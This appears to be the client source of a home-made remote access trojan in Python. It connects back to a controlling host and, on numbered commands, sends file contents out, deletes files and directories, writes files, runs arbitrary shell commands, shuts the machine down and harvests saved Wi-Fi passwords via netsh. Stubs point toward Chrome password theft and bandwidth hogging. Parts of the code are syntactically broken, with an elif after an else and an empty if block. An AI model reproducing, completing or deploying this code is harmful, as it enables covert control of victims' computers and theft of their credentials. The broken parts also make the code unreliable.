import os
import shutil
import socket

s = socket.socket()
port = 8080
#host = input(str("enter server addr: "))
host ="BlueEyesPC" # TODO
s.connect((host, port))

print("connected* ")

while 1:
    command = s.recv(1040)
    command = command.decode()
    print("command recived")
    if command == "1":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())

    elif command == "2":
        userInput = s.recv(5000)
        userInput = userInput.decode()
        files = os.listdir(userInput)
        files = str(files)
        s.send(files.encode())

    elif command == "3":
        filePath = s.recv(50000)
        filePath.decode()
        file = open(filePath, "rb")
        data = file.read()
        s.send(data)

    elif command == "4":
        # delete file
        path = s.recv(50000).decode()
        if os.path.exists("demofile.txt"):
            os.remove(path)
            s.send("Done".encode())
        else:
            s.send("Failed".encode())

    elif command == "5":
        # delete Dir
        path = s.recv(50000).decode()
        shutil.rmtree(path)
        s.send("Done".encode())

    elif command == "6":
        # make File
        path = s.recv(50000).decode()
        f = open(path, "w")

        contant = s.recv(500000).decode()
        f.write(str(contant))

        s.send("Done".encode())


    elif command == "7":
        # Send ipconfig
        string = os.system("ipconfig") 
        # TODO fix https://stackoverflow.com/questions/89228/calling-an-external-command-from-python/40319875#40319875
        s.send("Results of ipconfig******".encode())


    elif command == "8":
        # Exec custom command
        tar = s.recv(50000).decode()  # taskkill /IM notepad.exe
        try:
            os.system(str(tar))
            s.send("Done".encode())
        except:
            s.send("bad command".encode())


    elif command == "9":
        # Shutdown PC 
        # https://stackoverflow.com/a/40319875
        # os.system("echo Hello W0rld")

        # https://stackoverflow.com/a/50824776/5728614
        import sys
        if sys.platform == 'win32':
            import ctypes
            user32 = ctypes.WinDLL('user32')
            user32.ExitWindowsEx(0x00000008, 0x00000000)

        else:
            os.system('sudo shutdown now')
        # os.system('shutdown /p /f')# alt shutdown /s


    elif command == "10":
        # Get get wifi password list
        # https://nitratine.net/blog/post/get-wifi-passwords-with-python/
        import subprocess

        string = ""
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
                'utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                print("{:<30}|  {:<}".format(i, results[0]))
            except IndexError:
                print("{:<30}|  {:<}".format(i, ""))
            string += results.pop()
            string += "\n"

        s.send(str(string).encode())
    else:
        print("Command not recognised")


    elif command == "11":
        # Get Chrome passwords list
        tar = s.recv(50000).decode()  # taskkill /IM notepad.exe
        try:
            os.system(str(tar))
            s.send("Done".encode())
        except Exception:
            pass
    elif command == "12":
        # Bandwidth Hog 
        if isBandwidthHoging:
            
        tar = s.recv(50000).decode()  # taskkill /IM notepad.exe
        try:
            os.system(str(tar))
            s.send("Done".encode())
        except Exception:
            pass